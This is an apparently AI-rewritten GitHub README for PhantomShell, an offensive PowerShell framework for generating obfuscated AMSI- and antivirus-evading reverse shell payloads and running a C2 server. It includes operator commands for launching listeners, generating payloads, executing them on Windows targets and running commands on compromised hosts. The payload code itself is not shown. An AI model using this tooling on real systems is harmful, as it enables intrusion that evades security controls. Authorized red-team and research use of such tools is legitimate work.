Below is a **clean, professional GitHub README** rewritten from your content.
It removes clutter, improves structure, standardizes formatting, and adds professional sections typical of mature open-source security tools.

Your **LinkedIn and Twitter** are integrated properly and unnecessary items (email/discord) removed as requested.

---

# PhantomShell

<div align="center">
```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

**Advanced PowerShell AV / AMSI Evasion Framework with Enterprise C2 Server**

PhantomShell is a red-team oriented framework designed for authorized penetration testing and adversary simulation. It combines an advanced PowerShell payload generator with a lightweight Command-and-Control (C2) infrastructure for managing compromised hosts during controlled security assessments.

The framework focuses on payload obfuscation, AMSI evasion, polymorphic payload generation, and operational command management through both a CLI and a web-based interface.

---

# Key Capabilities

### Payload Generation

* Multi-layer PowerShell encoding
* AMSI-aware payload structures
* Polymorphic payload generation
* Variable randomization and obfuscation
* Multiple delivery formats

### Command & Control

* Lightweight Python-based C2 server
* Web interface for session management
* Interactive command shell for operators
* Multiple concurrent session handling
* Session monitoring and management

### Red Team Operations Support

* Reverse shell generation
* Payload hosting capability
* Command execution on compromised hosts
* Real-time operator interaction

---

# Architecture

```
Target System
    │
    │ Reverse Shell
    ▼
PhantomShell C2 Server
    │
    ├── CLI Interface
    │
    └── Web Management Interface
```

The payload executed on the target connects back to the PhantomShell C2 listener, allowing operators to execute commands and manage sessions through either the command line interface or the web dashboard.

---

# Installation

### Requirements

* Python 3.8+
* Linux or macOS host system
* Windows target machine

### Clone the Repository

```bash
git clone https://github.com/adrilaw/PhantomShell.git

cd PhantomShell
```

---

# Quick Start

### Start the C2 Server

```
python3 phantomc2.py c2 --port 4444 --web-port 8080 --password StrongPassword
```

This launches:

* Reverse shell listener on port **4444**
* Web interface on port **8080**

---

### Generate a Reverse Shell Payload

```
python3 phantomc2.py revshell -i YOUR_IP -p 4444
```

Copy the generated payload and execute it on the target Windows system.

---

### Access the Web Interface

```
http://YOUR_SERVER_IP:8080
```

Log in using the password defined during C2 startup.

---

# Command Reference

## Start C2 Server

```
python3 phantomc2.py c2
```

Available options:

| Option       | Description                    |
| ------------ | ------------------------------ |
| `--host`     | Bind address                   |
| `--port`     | Reverse shell listener port    |
| `--web-port` | Web UI port                    |
| `--password` | Web UI authentication password |
| `--no-cli`   | Disable interactive CLI        |

Example:

```
python3 phantomc2.py c2 --port 4444 --web-port 8080 --password RedTeam2026
```

---

## Generate Reverse Shell Payload

```
python3 phantomc2.py revshell -i <IP> -p <PORT>
```

Optional parameters:

| Option          | Description           |
| --------------- | --------------------- |
| `--obf-profile` | Obfuscation level     |
| `--layers`      | Encoding layers       |
| `--format`      | Output payload format |
| `--enc-b64`     | Encode IP and port    |

Example:

```
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3
```

---

## Payload Hosting Server

PhantomShell can host generated payloads via HTTP.

```
python3 phantomc2.py server -i <IP> -p <PORT>
```

Example:

```
python3 phantomc2.py server -i 10.10.10.5 -p 4444 --server-port 8000
```

---

# C2 Server Operations

Once a session connects, operators can interact with compromised hosts.

### List Sessions

```
sessions
```

### Interact With Session

```
interact <session_id>
```

### Execute Single Command

```
exec <session_id> <command>
```

Example:

```
exec 1 whoami
```

### Terminate Session

```
kill <session_id>
```

---

# Payload Features

PhantomShell implements several techniques intended to reduce detection by traditional security controls.

### Obfuscation Techniques

* Variable renaming
* Encoded execution layers
* Randomized payload structure

### Multi-Layer Encoding

Payloads may be wrapped in several encoding layers before execution.

Typical workflow:

```
PowerShell payload
   ↓
Unicode encoding
   ↓
Base64 encoding
   ↓
Execution wrapper
```

---

# Example Red Team Workflow

### 1. Start Infrastructure

```
python3 phantomc2.py c2 --port 4444 --web-port 8080
```

### 2. Generate Payload

```
python3 phantomc2.py revshell -i 192.168.1.100 -p 4444
```

### 3. Execute on Target

Run the generated command on the Windows system.

### 4. Manage Session

```
sessions
interact 1
whoami
hostname
```

---

# Security Considerations

PhantomShell should be deployed only in controlled environments and authorised engagements.

Operational security recommendations:

* Use strong passwords for the web interface
* Restrict access via firewall rules
* Deploy behind a reverse proxy with HTTPS
* Monitor server logs during engagements
* Rotate infrastructure after assessments

---

# Troubleshooting

### Port Already in Use

Check processes using the port:

```
netstat -tulpn | grep 4444
```

Terminate conflicting processes or use another port.

---

### Web Interface Not Accessible

Verify that the web service is running:

```
netstat -tulpn | grep 8080
```

Check firewall configuration if the service is listening but unreachable.

---

# Roadmap

Planned enhancements include:

* Encrypted C2 communications
* Database backend for session persistence
* Role-based multi-user access
* File upload and download capabilities
* SOCKS proxy support through compromised hosts
* Plugin architecture for extensions

---

# Contributing

Contributions are welcome.

Typical contribution areas include:

* Additional payload obfuscation techniques
* New payload delivery formats
* Improvements to the C2 server
* Documentation improvements
* Cross-platform testing

Workflow:

```
git clone
create feature branch
implement changes
submit pull request
```

---

# Legal Disclaimer

This software is intended **exclusively for authorised security testing and research**.

Acceptable use includes:

* Authorized penetration testing engagements
* Red team operations with written permission
* Cybersecurity research environments
* Capture-the-Flag competitions

Unauthorized use against systems without explicit permission may violate computer crime laws.

The author assumes **no responsibility for misuse**.

---

## 📜 **License**

ELIANA is licensed under the:

[GNU General Public License](LICENSE)

[PhantomShell Commercial License](C-LICENSE)

---

# Credits

PhantomShell builds on concepts and research from the offensive security community.

Inspirations include:

* Nishang PowerShell framework
* AMSI bypass research
* Red team tooling such as Cobalt Strike and Metasploit

---

# Author

**Adrien Dodin**

Cybersecurity Enthusiast | Offensive Security | Red Teaming

LinkedIn
[https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/](https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/)

Twitter
[https://twitter.com/AdrienDodin](https://twitter.com/AdrienDodin)

---

⭐ If this project helped you during research or a security engagement, consider starring the repository.
